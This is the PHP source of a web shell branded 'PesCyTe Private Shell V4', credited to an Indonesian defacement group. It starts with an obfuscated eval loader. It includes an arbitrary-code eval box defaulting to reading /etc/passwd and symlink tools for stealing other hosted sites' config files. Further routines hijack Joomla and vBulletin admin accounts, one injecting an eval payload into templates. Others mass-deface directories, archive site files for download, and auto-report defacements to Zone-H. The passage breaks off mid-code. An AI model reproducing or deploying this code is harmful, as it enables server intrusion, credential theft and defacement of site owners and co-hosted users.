<?php echo "<center><img src=\"https://i.imgsafe.org/2ad52244a3.png\" height=\"200px\"></center>"; $function_pwd = "hZDddxsxEIXvC2yHbgnIIUFcdSnFxsWJu3inF9ttC4baaIS0VbOQjeqdaxVYQl/Jf7i5KVVVzPnOY3NTSUuuCTtZSUtJyP9HLy+krNiwLry/Gly8G52IxurSmZqTRUXpox4kjtYTatZb7Ox3J4snL0i9l4KBffq4YBF1yTSkOuyHFFUCYiZoVn1AbcJei94NYN0aFToMp5OfN59qllisXisjvLEOhsA2ZaOIUXjWW0WjWizfrqV0kXzipcE2Q1aLS/Z7vQRh4ZJ0UvpDpFi2f/ldvijY6h8lLb5Bi3nCp+mcrW+nkrQR3DhFGNtyhEVO1pJmMDZb+C6fn+G3iHQ4/AJqxpuD2ocljFaveKRQ5eEDrI7gLyu2dOAx8FafjyFiGlJNi9rskORazsX9pOD5eZbuJlX21mMyZSEEwoKE3YaPhVT+GIViBLkKSlVEe0x2mItTCtLWJG7QuL7O2Ya7kCyvSpC71vimZdY508LMlISH2LF4IJIunO8o2v4fNbka/AU=";eval(str_rot13(gzinflate(str_rot13(base64_decode(($function_pwd))))));?><div id="menu"><a href="?<?php echo "y=".$pwd;?>&amp;x=about"><center>-=[+] About Pesantren Cyber Team [+]=-<center></a></div>
</td></tr></table></td><td class="top" width='60%'><?php echo $buff;?></td>&nbsp;&nbsp;<td style="width:20%;"></td></tr></table></div>
<div id="menu"><ul class="menu"><a href="?<?php echo "y=".$pwd;?>">Files</a><a href="?<?php echo "y=".$pwd;?>&amp;x=shell">Shell</a><a href="?<?php echo "y=".$pwd;?>&amp;x=upload">Upload</a><li><a>Symlink</a><ul><li><a href="?<?php echo "y=".$pwd;?>&amp;x=domains">Domains</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=configs">Grab Configs</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=indi">Indi Config</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=sf">Symlink File</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=symlinksa">Symlink Sa</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=sec">Symlink Server</a></li></ul>
<li><a>Tools</a><ul><li><a href="?<?php echo "y=".$pwd;?>&amp;x=AnonGhost">AnonGhost</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=cgiproxy">CGI Proxy</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=cptoolkit">cPanel Toolkit</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=DM">DM Shell</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=IndoXploit">IndoXploit</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=PescyteV2">Pescyte V2</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=phpini">php.ini</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=SabunMassal">Sabun Massal</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=W0rm">W0rm</a></li></ul></li>
<li><a>SQL</a><ul><li><a href="?<?php echo "y=".$pwd;?>&amp;x=Adminer">Adminer</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=mysql">MySQL 1</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=mysql2">MySQL 2</a></li></ul></li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=php">Eval</a><a href="?<?php echo "y=".$pwd;?>&amp;x=back">Remote</a><a href="?<?php echo "y=".$pwd;?>&amp;x=mass">Mass</a><a href="?<?php echo "y=".$pwd;?>&amp;x=phpinfo">PHP Info</a><a href="?<?php echo "y=".$pwd;?>&amp;x=mirror">Mirror</a><li><a>Joomla</a><ul><li><a href="?<?php echo "y=".$pwd;?>&amp;x=joomla">From keyboard</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=js">From symlink</a></li></ul></li><li><a>Wordpress</a><ul><li><a href="?<?php echo "y=".$pwd;?>&amp;x=keyboard">From Keyboard</a></li><li><a href="?<?php echo "y=".$pwd;?>&amp;x=config">From Symlink</a></li></ul></li><a href="?<?php echo "y=".$pwd;?>&amp;x=vb">VB</a><a href="?<?php echo "y=".$pwd;?>&amp;x=rdp">RDP Creator</a><a href="?<?php echo "y=".$pwd;?>&amp;x=jumping">Jumping</a><a href="?<?php echo "y=".$pwd;?>&amp;x=ambil">Ambil Script</a>&nbsp;&nbsp;</ul></div><br><br>
<?php if(isset($_GET['x']) && ($_GET['x'] == 'php')){?><form action="?y=<?php echo $pwd;?>&amp;x=php" method="post"><table class="cmdbox"><tr><td><textarea class="output" name="cmd" id="cmd" cols=90> 
<?php 	if(isset($_GET['dir'])) {
		$dir = $_GET['dir'];
		chdir($_GET['dir']);
	} else {
		$dir = getcwd();
	}
	$dir = str_replace("\\","/",$dir); ?>
<?php if(isset($_POST['submitcmd'])) {echo eval(magicboom($_POST['cmd']));}else echo "echo file_get_contents('/etc/passwd');";?></textarea></td></tr><tr><td><input style="width:19%;" class="inputzbut" type="submit" value="Do !" name="submitcmd" /></td></tr></form></table></form> <?php }
elseif(isset($_GET['x']) && ($_GET['x'] == 'about')){
echo "<html><head><title>-=[+] About US ~ Pesantren Cyber Team [+]=-</title>";
echo "<body bgcolor='#000033'>";
echo "<center><h1><font color='blue'></font></center></head>
</h1>";
echo "<font color='yellow'><center></center></font>";
echo "<div align='center'>";
echo '<center><br><br><div class="mybox"><h2 style="font-size:50px;" class="k2ll33d2">PesCyTe Private Shell V4</h2><k>By Anonymous Indonesia<br><br><hr>';
echo '<h1><k>Thanks to : </h1><k><hr><marquee><k>(+) K2LL33D ~ IDBTE4M ~ HGL ~ DM-FAMILY ~ BN-TEAM ~ PBM ~ IndoXploit [Coder Team] ~ And All Anonymous Member (+)</marquee><br><hr><br><a href="http://fb.com/PesCyTe">Pesantren Cyber Team © 2016</a> | k2ll33d Shell - Recoded</h3></div></center>';}
elseif(isset($_GET['x']) && ($_GET['x'] == 'sf')) {@set_time_limit(0);@mkdir('sym',0777);error_reporting(0);$htaccess  = "Options all \n DirectoryIndex gaza.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";$op =@fopen ('sym/.htaccess','w');fwrite($op ,$htaccess);echo '<center><br><br><br><div class="mybox"><h2 class="k2ll33d2">Symlinker</h2><br><form method="post"> File Path:<br><input class="inputz" type="text" name="file" value="/home/user/public_html/config.php" size="60"/><br>Symlink Name<br><input class="inputz" type="text" name="symfile" value="s.txt" size="60"/><br><br><input class="inputzbut" type="submit" value="symlink" name="symlink" /><br><br></form></div></center>';$target = $_POST['file'];$symfile = $_POST['symfile'];$symlink = $_POST['symlink'];if ($symlink) {@symlink("$target","sym/$symfile");echo '<br><center><a target="_blank" href="sym/'.$symfile.'" >'.$symfile.'</a><br><br><br><br></center>';}}
elseif(isset($_GET['x']) && ($_GET['x'] == 'js')) {if ($_POST['symjo']) {$config = file_get_contents($_POST['url']);$user = $_POST['user'];$pass = md5($_POST['pass']);function ex($text,$a,$b){$explode = explode($a,$text);$explode = explode($b,$explode[1]);return $explode[0];}if($config && ereg('JConfig',$config)){$psswd =  ex($config,'$password = \'',"';");$username = ex($config,'$user = \'',"';");$dbname = ex($config,'$db = \'',"';");$prefix = ex($config,'$dbprefix = \'',"';");$host = ex($config,'$host = \'',"';");$email = ex($config,'$mailfrom = \'',"';");$formn = ex($config,'$fromname = \'',"';");$conn = mysql_connect($host,$username,$psswd) or die(mysql_error());mysql_select_db($dbname,$conn) or die($username.' '.$psswd.' '.$host.' '.$dbname);$query = @mysql_query("UPDATE `".$prefix."users` SET `username` ='".$user."' , `password` = '".$pass."', `usertype` = 'Super Administrator', `block` = 0");if ($query) {echo '<center><h2 class="k2ll33d2">Done !</h2></center><br><table width="100%"><tr><th width="30%">site name</th><th width="20%">user</th><th width="20%">password</th><th width="20%">email</th></tr><tr><td width="20%"><font size="2" color="red">'.$formn.'</font></td><td width="20%">'.$user.'</td><td with="20%">'.$_POST["pass"].'</td><td width="20%">'.$email.'</td></tr></table>';}else {echo '<h2 class="k2ll33d2"><font color="#ff0000">ERROR !</font></h2>';}}else die('<h2 class="k2ll33d2"><font color="red">Not a joomla config</font></h2>');}else { ?> <center><br><br><div class="mybox"><form method="post"><table><h2 class="k2ll33d2">Joomla login changer ( symlink version )</h2><tr><td>config link : </td><td><input class="inputz" type="text" name="url" value=""></td></tr><tr><td>new user : </td><td><input class="inputz" type="text" name="user" value="admin"></td></tr><tr><td>new password : </td><td><input class="inputz" type="text" name="pass" value="123123"></td></tr><tr><td><br></td></tr><tr><td><input type="submit" class="inputzbut" name="symjo" value="change"></td><br></tr></table></form></div></center><?php }}
elseif(isset($_GET['x']) && ($_GET['x'] == 'sec')){$d0mains = @file("/etc/named.conf");

if($d0mains){@mkdir("k2",0777);@chdir("k2");@exe("ln -s / root");$file3 = 'Options all
DirectoryIndex Sux.html
AddType text/plain .php 
AddHandler server-parsed .php 
AddType text/plain .html 
AddHandler txt .html 
Require None 
Satisfy Any';$fp3 = fopen('.htaccess','w');$fw3 = fwrite($fp3,$file3);@fclose($fp3);echo "<table align=center border=1 style='width:60%;border-color:#333333;'><tr><td align=center><font size=3>S. No.</font></td><td align=center><font size=3>Domains</font></td><td align=center><font size=3>Users</font></td><td align=center><font size=3>Symlink</font></td></tr>";$dcount = 1;foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr align=center><td><font size=3>" . $dcount . "</font></td><td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td><td>".$user['name']."</td><td><a href='/k2/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; flush();$dcount++;}}}echo "</table>";}else{$TEST=@file('/etc/passwd');if ($TEST){@mkdir("k2",0777);@chdir("k2");exe("ln -s / root");$file3 = 'Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any';$fp3 = fopen('.htaccess','w');$fw3 = fwrite($fp3,$file3);@fclose($fp3);echo "<br><br><table align=center border=1><tr><td align=center><font size=4>S. No.</font></td><td align=center><font size=4>Users</font></td><td align=center><font size=4>Symlink</font></td></tr>";$dcount = 1;$file = fopen("/etc/passwd", "r") or exit("Unable to open file!");while(!feof($file)){$s = fgets($file);$matches = array();$t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")continue;echo "<tr><td align=center><font size=3>" . $dcount . "</td><td align=center><font class=txt>" . $matches . "</td>";echo "<td align=center><font class=txt><a href=/k2/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";$dcount++;}fclose($file);echo "</table>";}else{if($os != "Windows"){@mkdir("k2",0777);@chdir("k2");@exe("ln -s / root");$file3 = 'Options all 
 DirectoryIndex Sux.html
 AddType text/plain .php
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any';$fp3 = fopen('.htaccess','w');$fw3 = fwrite($fp3,$file3);@fclose($fp3);echo "<br><br><center><div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2><table align=center border=1><tr><td align=center><font size=4>id</font></td><td align=center><font size=4>Users</font></td><td align=center><font size=4>Symlink</font></td></tr>";$temp = "";$val1 = 0;$val2 = 1000;for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);if ($uid)$temp .= join(':',$uid)."\n";}echo '<br/>';$temp = trim($temp);$file5 = fopen("test.txt","w");fputs($file5,$temp);fclose($file5);$dcount = 1;$file = fopen("test.txt", "r") or exit("Unable to open file!");while(!feof($file)){$s = fgets($file);$matches = array();$t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")continue;echo "<tr><td align=center><font size=3>" . $dcount . "</td><td align=center><font class=txt>" . $matches . "</td>";echo "<td align=center><font class=txt><a href=/k2/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";$dcount++;}fclose($file);echo "</table></div></center>";unlink("test.txt");} else echo "<center><font size=4>Cannot create Symlink</font></center>";}}}
elseif(isset($_GET['x']) && ($_GET['x'] == 'mass')){echo "<center><div class='mybox'><br/><b><font color=#04BA4C>-=[ Mass Deface Directory ]=-</font></b><br>";
error_reporting(0);
$deface=
'Anonymous Indonesia Was Here !!!';
?>
<form ENCTYPE="multipart/form-data" action="<?php $_SERVER['PHP_SELF']?>" method='post'>
<td><table><table class="tabnet" >
<form hethot='post'>
<tr>
        <tr>
        <td>&nbsp;&nbsp;Folder</td><td><input class ='inputz' type='text' name='path' size='60' value="<?php echo getcwd();?>"></td>
        </tr><br>
        <tr>
        <td>Nama File</td><td><input class ='inputz' type='text' name='file' size='60' value="404.html"></td>
        </tr>
        <tr>
        </tr>
</tr>
<th colspan='2'><b>Script Deface</b></th><br></table>
<textarea name='index' rows='10' cols='68'>
<?php
echo $deface;
?>
</textarea><br><br>
<center><br><input class='inputzbut' type='submit' value="&nbsp;&nbsp;Deface&nbsp;&nbsp;"></center></form></table><br></form>
 
<?php $mainpath=$_POST[path];$file=$_POST[file];$dir=opendir("$mainpath");$code=base64_encode($_POST[index]);$indx=base64_decode($code);while($row=readdir($dir)){$start=@fopen("$row/$file","w+");$finish=@fwrite($start,$indx);if ($finish){echo "$row/$file ==> Done<br>";}}
echo "</center></div>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'vb')) {if(empty($_POST['index'])){echo "<center><br><br><div width='100%' class='mybox'><br><h2 class='k2ll33d2'>Vbulletin index changer</h2><br><FORM method='POST'>host : <INPUT size='12' class='inputz' value='localhost' name='localhost' type='text'>&nbsp;|&nbsp;database : <INPUT class='inputz' size='12' value='db_name' name='database' type='text'>&nbsp;|&nbsp;username : <INPUT class='inputz' size='10' value='db_user' name='username' type='text'>&nbsp;|&nbsp;password : <INPUT class='inputz' size='10' value='bd_pass' name='password' type='text'>&nbsp;|&nbsp;perfix : <input class='inputz' size='10' value='' name='perfix' type='text'><br><br><textarea class='inputz' name='index' cols='40' rows='10'>Hacked By ReZK2LL Team</textarea><br><INPUT class='inputzbut' value='Deface' name='send' type='submit'></FORM></div></center>";}else{$localhost = $_POST['localhost'];$database = $_POST['database'];$username = $_POST['username'];$password = $_POST['password'];$perfix = $_POST['perfix'];$index = $_POST['index'];@mysql_connect($localhost,$username,$password) or die(mysql_error());@mysql_select_db($database) or die(mysql_error());$index=str_replace("\'","'",$index);$set_index  = "{\${eval(base64_decode(\'";$set_index .= base64_encode("echo '$index';");$set_index .= "\'))}}{\${exit()}}</textarea>";$ok=@mysql_query("UPDATE ".$perfix."template SET template ='".$set_index."' WHERE title ='FORUMHOME'") or die(mysql_error());if($ok){echo "Defaced<br><br>";}}}
elseif(isset($_GET['x']) && ($_GET['x'] == 'jumping')){
echo "<center><br><br><div width='100%' class='mybox'><br><h2 class='k2ll33d2'>Intip Kamar Lain</h2><br>";
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $pwd)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?y=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?y=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $pwd)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?y=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?y=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<k>Maaf kang, Salto Mode is OFF !<br>Can't read /etc/passwd");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<k>Maaf kang, Salto Mode is OFF !<br>Can't read /etc/passwd";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?y=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?y=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>ga bisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		echo "<k>Maaf kang, Salto Mode is OFF !<br><br>";
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div><div>";
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'ambil')){
echo "<center><br><br><div width='100%' class='mybox'><br><h2 class='k2ll33d2'>Grab Script</h2><br>";
echo "<form method=\"post\" action=\"\" enctype=\"multipart/form-data\">
<input class=inputz type=text name=sites value=\"$pwd\" size=60><br><br>
<input class=\"inputzbut\" type=\"submit\" name=\"go\" value=\"Ambil !\" style=\"margin: 5px auto; hight: 25px; width: 100px;\">
</form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
if($go) {
foreach($site as $sites) {
$folder="$sites";
$output="hasil-".$_SERVER['HTTP_HOST'].".zip";
$zip = new ZipArchive();

if ($zip->open($output, ZIPARCHIVE::CREATE) !== TRUE) {
    die ("Unable to open Archirve");
}

$all= new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder));

foreach ($all as $f=>$value) {
	$zip->addFile(realpath($f), str_replace(":","",$f)) or die ("ERROR: Unable to add file: $f");
}
$zip->close();
echo "<k>Selamat Anda Berhasil Mengambil Data pada dir <br>$folder<br><br>Untuk Mendownloadnya Silahkan <a href=\"?y=$pwd&dl=".$pwd."$output\">Klik di sini.</a><br>";
}
}
echo "</div>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'mirror')){
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		$team = $_POST['team'];
		$pocid = "SQL Injection";
		echo "<center><div class='mybox'>";
		echo "Mirror Onhold : <br><a href='http://zone-h.com/archive/published=0' target='_blank'>Zone-H</a>&nbsp;|&nbsp;
		<a href='http://aljyyosh.org/onhold.php' target='_blank'>Aljyyosh</a>&nbsp;|&nbsp;
		<a href='#' target='_blank'>Defacer ID</a><br>====================================<br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		function aljyyosh($url,$nick) {
			$ch = curl_init("http://aljyyosh.org/single.php");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_COOKIE, "alj=aljyyosh");
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "hacker=$nick&site=$url&how=1&why=1&addsite=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		function defacerid($url,$nick) {
			$ch = curl_init("https://defacer.id/notify.html");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "attacker=$nick&team=$team&url=$url&poc=$pocid");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url ==> Zone-H <font color=lime>[OK]</font>&nbsp;|&nbsp;";
			} else {
				echo "$url ==> Zone-H <font color=lime>[ERROR]</font>&nbsp;|&nbsp;";
			}
			$aljyyosh = aljyyosh($url,$nick);
			if(preg_match("/<font color=red> OK<\/font>/", $aljyyosh)) {
				echo "Aljyyosh <font color=lime>[OK]</font>&nbsp;|&nbsp;";
			} else {
				echo "Aljyyosh <font color=lime>[ERROR]</font>&nbsp;|&nbsp;";
			}
			$defacerid = defacerid($url,$nick);
			if(preg_match("/sukses/i", $defacerid)) {
				echo "Defacer ID <font color=lime>[OK]</font><br>====================================<br>";
			} else {
				echo "Defacer ID <font color=lime>[ERROR]</font><br>====================================<br>";
			}
		}
		echo "</center></div>";
	} else {
		echo "<br><br><center><div class='mybox'><h2 class='k2ll33d2'>Mass Mirror Poster</h2><h3><k>-=[+] Zone-H | Aljyyosh | Defacer ID [+]=-</h3><p>&nbsp;</p><form enctype='multipart/form-data' method='POST'><div align='center'><span lang='en-us'><b>Defacer&nbsp;:</b></span><input class='inputz' name='nick' type='text' value='Anonymous Indonesia' /><br/><b>Team&nbsp;:</b></span><input class='inputz' name='team' type='text' value='Pesantren Cyber Team' /><br/><table width='55%'><tr><td align='center'><span lang='en-us'><b>Domains:</b></span><p align='center'>&nbsp;<textarea rows='30' name='url' placeholder='Taruh Domain ente di sini !' cols='50' class='inputz'></textarea><br/><span lang='en-us'><input class='inputzbut' type='submit' value='Send' name='submit'></p></td></tr></table></form></div>";
	}
	echo "</center>";
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'joomla')){if(empty($_POST['pwd'])){echo "<br><br><br><center><div class='mybox'><h2 class='k2ll33d2'>Joomla login changer</h2><FORM method='POST'><br><br><br>DB_Prefix :&nbsp;&nbsp;<INPUT class ='inputz' size='8' value='jos_' name='prefix' type='text'>&nbsp;host :&nbsp;&nbsp;<INPUT class ='inputz' size='10' value='localhost' name='localhost' type='text'>&nbsp;database :&nbsp;&nbsp;<INPUT class ='inputz' size='10' value='database' name='database' type='text'>&nbsp;username :&nbsp;&nbsp;<INPUT class ='inputz' size='10' value='db_user' name='username' type='text'>&nbsp;password :&nbsp;&nbsp;<INPUT class ='inputz' size='10' value='db_pass' name='password' type='text'><br>&nbsp;&nbsp;<br>New Username:&nbsp;&nbsp;<INPUT class ='inputz' name='admin' size='15' value='k2'><br><br>New Password:&nbsp;&nbsp;<INPUT class ='inputz' name='pwd' size='15' value='123123'><br><br>&nbsp;&nbsp;<INPUT value='change' class='inputzbut' name='send' type='submit'></FORM></div></center>";}else {$prefix = $_POST['prefix'];$localhost = $_POST['localhost'];$database  = $_POST['database'];$username  = $_POST['username'];$password  = $_POST['password'];$admin = $_POST['admin'];$pd = ($_POST["pwd"]);$pwd = md5($pd);@mysql_connect($localhost,$username,$password) or die (mysql_error());@mysql_select_db($database) or die (mysql_error());$SQL=@mysql_query("UPDATE ".$prefix."users SET username ='".$admin."' WHERE name = 'Super User' or name = 'Super Utilisateur' or id='62'") or die (mysql_error());$SQL=@mysql_query("UPDATE ".$prefix."users SET password ='".$pwd."' WHERE name = 'Super User' or name = 'Super Utilisateur' or id='62'") or die (mysql_error());if($SQL) echo "<br><br><center><h1>Done... go and login</h1></center>";}}
elseif(isset($_GET['x']) && ($_GET['x'] == 'mysql')){if(isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport'])){$sqlhost = $_GET['sqlhost'];$sqluser = $_GET['sqluser'];$sqlpass = $_GET['sqlpass'];$sqlport = $_GET['sqlport'];if($con = @mysql_connect($sqlhost.":".$sqlport,$sqluser,$sqlpass)){$msg .= "<div style='width:99%;padding:4px 10px 0 10px;'>";$msg .= "<p>Connected to ".$sqluser."<span class='gaya'>@</span>".$sqlhost.":".$sqlport;$msg .= "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;'>[ databases ]</a>";if(isset($_GET['db'])) $msg .= "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."'>".htmlspecialchars($_GET['db'])."</a>";if(isset($_GET['table'])) $msg .= "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."&amp;table=".$_GET['table']."'>".htmlspecialchars($_GET['table'])."</a>";$msg .= "</p><p>version : ".mysql_get_server_info($con)." proto ".mysql_get_proto_info($con)."</p>";$msg .= "</div>";echo $msg;if(isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))){$db = $_GET['db'];$query = "DROP TABLE IF EXISTS b374k_table;\nCREATE TABLE `b374k_table` ( `file` LONGBLOB NOT NULL );\nLOAD DATA INFILE '/etc/passwd'\nINTO TABLE b374k_table;SELECT * FROM b374k_table;\nDROP TABLE IF EXISTS b374k_table;";$msg = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'><input type='hidden' name='y' value='".$pwd."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>$query</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";$tables = array();$msg .= "<table class='explore' style='width:99%;'><tr><th>available tables on ".$db."</th></tr>";$hasil = @mysql_list_tables($db,$con);
while(list($table) = @mysql_fetch_row($hasil)){@array_push($tables,$table);} @sort($tables);
foreach($tables as $table){$msg .= "<tr><td><a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."&amp;table=".$table."'>$table</a></td></tr>";} $msg .= "</table>";} 
elseif(isset($_GET['table']) && (!isset($_GET['sqlquery']))){
